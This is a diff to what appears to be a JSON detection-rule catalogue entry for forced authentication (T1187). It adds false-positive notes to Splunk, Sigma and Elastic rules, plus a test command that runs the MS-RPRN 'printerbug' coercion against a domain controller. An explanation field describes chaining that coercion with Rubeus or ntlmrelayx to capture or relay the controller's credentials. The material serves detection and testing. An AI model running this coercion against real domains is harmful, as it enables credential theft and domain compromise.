@@ -131,7 +131,8 @@
         "confidence": "medium",
         "log_ids": [
           "4624"
-        ]
+        ],
+        "false_positives": "Service accounts with automated logons, scheduled tasks"
       },
       {
         "platform": "splunk",
@@ -145,7 +146,8 @@
         "confidence": "medium",
         "log_ids": [
           "4624"
-        ]
+        ],
+        "false_positives": "Service accounts with automated logons, scheduled tasks"
       },
       {
         "platform": "splunk",
@@ -156,7 +158,8 @@
           "T1187"
         ],
         "fidelity": "signature",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate admin activity using the same Windows APIs or tools"
       },
       {
         "platform": "sigma",
@@ -167,7 +170,8 @@
           "T1187"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate admin activity using the same Windows APIs or tools"
       },
       {
         "platform": "sigma",
@@ -178,7 +182,8 @@
           "T1187"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate admin activity using the same Windows APIs or tools"
       },
       {
         "platform": "elastic",
@@ -188,7 +193,9 @@
         "attack": [
           "T1187"
         ],
-        "fidelity": "behavioral"
+        "fidelity": "behavioral",
+        "false_positives": "Service accounts with automated logons, scheduled tasks",
+        "confidence": "high"
       }
     ],
     "visibility": {
@@ -218,7 +225,8 @@
         "Review Windows Security Event Log for surrounding context (5 min before/after)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "MS-RPRN.exe \\\\<target_dc_fqdn> \\\\<listener_host_fqdn>"
     }
   },
   "explain": "Forces a remote machine (often a DC) to authenticate to a host you control:\n  MS-RPRN.exe               trigger the Print System 'printerbug' RPC (RpcRemoteFindFirstPrinterChangeNotification)\n  \\\\<target_dc_fqdn>       the victim you coerce (it will authenticate outbound)\n  \\\\<listener_host_fqdn>   where it authenticates TO - your listener\nPoint it at an unconstrained-delegation host running Rubeus monitor to capture the DC's TGT, or at ntlmrelayx to relay. DFSCoerce/WSPCoerce are alternatives when the print service is disabled."
